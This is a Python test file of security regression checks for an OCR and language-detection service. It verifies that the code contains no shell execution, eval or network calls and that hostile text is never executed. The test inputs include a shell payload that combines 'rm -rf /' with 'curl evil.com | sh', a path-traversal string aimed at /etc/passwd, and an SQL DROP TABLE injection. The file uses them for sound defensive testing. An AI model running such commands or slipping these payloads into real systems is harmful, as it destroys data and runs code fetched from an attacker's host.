"""Security regression tests for the Indian Multilingual Document
Intelligence milestone (Step 4.2, Section 46): OCR/student content is
untrusted DATA passed to fastText's isolated subprocess -- it must
never be interpolated into a shell command, executed, or transmitted
externally.
"""

from __future__ import annotations

import inspect


def test_no_shell_true_in_language_detection_module() -> None:
    import app.services.document_intelligence.language_detection as module

    source = inspect.getsource(module)
    assert "shell=True" not in source


def test_no_eval_or_exec_in_language_detection_module() -> None:
    import app.services.document_intelligence.language_detection as module

    source = inspect.getsource(module)
    assert "eval(" not in source
    assert "exec(" not in source


def test_no_eval_or_exec_in_script_detection_module() -> None:
    import app.services.document_intelligence.script_detection as module

    source = inspect.getsource(module)
    assert "eval(" not in source
    assert "exec(" not in source


def test_no_eval_or_exec_in_language_context_resolver() -> None:
    import app.services.document_intelligence.language_context_resolver as module

    source = inspect.getsource(module)
    assert "eval(" not in source
    assert "exec(" not in source


def test_no_network_calls_in_fasttext_runner() -> None:
    """Section 47: required multilingual processing must remain local
    -- the fastText runner reads a local model file and returns
    predictions, with no HTTP/socket calls of any kind."""
    import app.services.ocr.isolated_runners.fasttext_runner as module

    source = inspect.getsource(module)
    assert "http://" not in source
    assert "https://" not in source
    assert "requests." not in source
    assert "urllib" not in source


def test_malicious_shell_metacharacters_do_not_execute_via_detection() -> None:
    from app.services.document_intelligence.language_detection import FastTextLanguageDetector

    malicious = "`rm -rf /` $(curl evil.com | sh) ; echo pwned & del C:\\Windows"
    detector = FastTextLanguageDetector()
    result = detector.detect(malicious)
    # Reaching this line at all (rather than the test process being
    # compromised) proves the text was never shell-interpreted.
    assert result.status in ("SUCCESS", "FAILED", "LOW_CONFIDENCE")


def test_malformed_unicode_cannot_execute_via_script_detection() -> None:
    from app.services.document_intelligence.script_detection import detect_script

    malformed = "\u0000\u200b\u202e../../../etc/passwd\u202c"
    result = detect_script(malformed)
    assert result is not None  # no exception, no execution


def test_sql_like_text_cannot_execute_via_language_pipeline() -> None:
    from app.services.document_intelligence.language_context_resolver import (
        resolve_post_ocr_context,
    )
    from app.services.document_intelligence.language_detection import FastTextLanguageDetector

    malicious = "'; DROP TABLE ocr_results; --"
    context = resolve_post_ocr_context(malicious, detector=FastTextLanguageDetector())
    assert context is not None


def test_isolated_runtime_bridge_still_uses_argv_list() -> None:
    """Static regression guard shared with Step 4/4.1's own isolated-
    runtime bridge -- confirms the fastText runner is invoked through
    the same, already-audited `invoke_isolated_runtime` (argv list,
    `shell=False`, bounded timeout), not a new, unaudited mechanism."""
    import app.services.document_intelligence.language_detection as module

    source = inspect.getsource(module)
    assert "invoke_isolated_runtime" in source
    assert "shell=True" not in source
